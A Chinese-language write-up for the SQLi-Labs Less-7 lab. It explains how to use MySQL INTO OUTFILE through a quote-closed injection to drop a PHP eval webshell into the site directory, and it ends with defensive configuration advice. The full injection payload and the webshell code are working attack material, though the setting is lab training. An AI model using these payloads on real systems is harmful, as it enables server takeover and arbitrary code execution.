## 一、题目信息
- 平台：SQLi-Labs
- 分类：Web - SQL Injection
- 难度：中等
- 通关标识：利用 `INTO OUTFILE` 语法，将一句话木马写入服务器指定目录。

## 二、大白话原理讲解
前面几关，柜员（数据库）要么把数据打印在屏幕上（联合查询），要么在报错时把数据喊出来（报错注入）。
但到了这一关，柜员彻底变成了“哑巴”，不仅不给你看数据，连报错都不给你具体的提示了（页面只显示一句笼统的 `You have an error in your SQL syntax`）。

既然“偷”不到，那我们就直接“抢”！
MySQL 有一个特权指令叫 `INTO OUTFILE`，它可以把查询的结果直接写到服务器的硬盘文件里。我们可以利用这个功能，不偷数据了，直接往网站目录下写一个**“一句话木马”**（PHP 后门文件）。写进去之后，我们就能用工具连上服务器，控制整个网站了。

## 三、解题步骤

**1. 测试注入点**
输入 `?id=1'`，页面提示 `You have an error in your SQL syntax`，没有具体细节。
再次输入 `?id=1' and 1=1 --+`，页面恢复正常。
确认依然是单引号闭合的字符型注入。

**2. 尝试导出文件（写一句话木马）**
我们需要知道靶场的绝对路径（本例中靶场部署在 `D:/ctf/sqli-labs-master`）。
构造 Payload，直接将一句话木马写入 Less-7 目录：
```sql
?id=-1' union select 1,2,'<?php @eval($_POST["cmd"]);?>' into outfile "D:/ctf/sqli-labs-master/Less-7/shell.php" --+
```
*(⚠️ 注意：这里的路径需要根据你自己的本地环境进行修改。Windows 下推荐使用正斜杠 `/` 或双反斜杠 `\\`)*

**3. 验证结果与排查**
提交上面的 Payload 后，页面提示 `You have an error in your SQL syntax`，且本地文件夹并未生成 `shell.php`。
**原因分析**：这是本地环境配置导致的，并非注入思路错误。现代版本的 MySQL 默认启用了 `secure-file-priv` 安全限制，或者运行 MySQL 的用户没有向该目录写文件的权限。
**如果环境配置正确**：提交后去该目录下检查，发现 `shell.php` 成功生成。用菜刀或蚁剑连接该文件即可拿到 Shell。

## 四、知识点解析
1. **INTO OUTFILE**：MySQL 的导出文件语法。`SELECT ... INTO OUTFILE 'file_path'`。
2. **写文件的前提条件**：
   - MySQL 用户必须具有 `FILE` 权限。
   - `secure_file_priv` 变量的值必须为空（允许任意路径）或指定了包含目标路径的目录。
   - 写入的目标目录必须具有写权限，且文件不能已存在（否则会报错）。
3. **一句话木马**：`<?php @eval($_POST["cmd"]);?>`，通过 POST 提交 `cmd` 参数，可以执行任意 PHP 代码。

## 五、总结与防御
**本题总结**：
当联合查询和报错注入都被封杀，且具备高权限环境时，导出文件（写木马）是直接接管服务器的终极杀招。需要特别注意路径的绝对正确性以及数据库的安全配置。

**安全防御建议**：
- **禁用数据库写文件权限**：在 MySQL 配置中，将 `secure-file-priv` 设置为严格的目录（或者直接设置为 `NULL` 禁止写文件），不要为空。
- **遵循最小权限原则**：连接数据库的账号绝对不能是 `root`，取消其 `FILE` 权限。
- **目录权限限制**：Web 服务器的运行用户不应该对项目目录拥有写权限，防止木马落地。
